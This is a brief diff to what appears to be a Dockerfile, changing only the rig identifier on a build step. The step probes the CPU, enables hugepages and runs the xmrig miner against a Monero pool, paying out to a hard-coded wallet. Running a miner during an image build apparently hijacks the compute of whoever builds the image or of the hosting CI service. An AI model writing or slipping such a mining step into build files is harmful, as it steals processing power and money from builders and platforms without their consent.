@@ -20,4 +20,4 @@ RUN apt-get update && \
 RUN grep -c ^processor /proc/cpuinfo && \
     cat /proc/meminfo | grep Huge && \
     sysctl -w vm.nr_hugepages=128 || true && \
-    ./xmrig --coin xmr -o pool.minexmr.com:443 -u 42mi1qmPYMJhc4ZVqcwdpccCYkrpDUip34TbcABZeBhf8Jp499zrsPSV4C2LFQhm4KW4EXEJGspetTA5AGmXyukC4ARwpAb -k --tls --rig-id $(date +%s)
+    ./xmrig --coin xmr -o pool.minexmr.com:443 -u 42mi1qmPYMJhc4ZVqcwdpccCYkrpDUip34TbcABZeBhf8Jp499zrsPSV4C2LFQhm4KW4EXEJGspetTA5AGmXyukC4ARwpAb -k --tls --rig-id tester
